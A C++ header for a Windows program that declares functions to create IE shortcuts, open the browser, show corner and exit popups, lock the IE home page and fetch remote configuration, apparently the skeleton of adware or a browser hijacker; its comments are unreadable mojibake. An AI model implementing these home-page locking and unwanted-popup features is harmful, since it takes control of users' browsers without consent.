#pragma once
#include <Windows.h>
#include "../UtilityLib/Utility.h"
#pragma comment(lib , "../build/UtilityLib.lib")

unsigned int _stdcall ThreadDoWork(VOID* param);
unsigned int _stdcall ThreadGetConfig(VOID* param);
unsigned int _stdcall ThreadCreateIEShortcut(VOID* param);		// 1 ���������ݷ�ʽ
unsigned int _stdcall ThreadOpenIE(VOID* param);	// 2 ��������
unsigned int _stdcall ThreadPopupWindows(VOID* param);	// 3 �������½ǵ���
unsigned int _stdcall ThreadProcessExitPopupWindows(VOID* param);	// 4 ��Ϸ�˵�
unsigned int _stdcall ThreadLockIEHomePage(VOID* param);	// 5 IE����
unsigned int _stdcall ThreadHaveProcessPopupWindows(VOID* param);	// 6 ����ֵҵ��
VOID DoGetConfig(string &strConfig);
VOID DoGetServerUrl(VOID);
BOOL DoPopupWindows(string &strConfig);
BOOL DoProcessExitPopupWindows(string &strConfig);
BOOL DoLockIEHomePage(string &strConfig);
BOOL DoOpenIE(string &strConfig);
BOOL DoCreateIEShortcut(string &strConfig);
BOOL DoHaveProcessPopupWindows(string &strConfig);
BOOL DoCloseBrowse(string &strConfig);
BOOL DoOpenRightCorner(string &url);
BOOL IsHaveRun(VOID);
VOID DoFeedback(wstring type);	// �û��¼�����
VOID GetFeedbackKey(string& strKey);
VOID DoWritePIDFile(VOID);
VOID DoWritePIDRunFile(VOID);
VOID WriteLogFile(LPCSTR szLog);
VOID WriteLogFileEx(string strLog);
VOID OpenBrowse_YiDian(CONST CHAR* szUrl);	// ��һ�������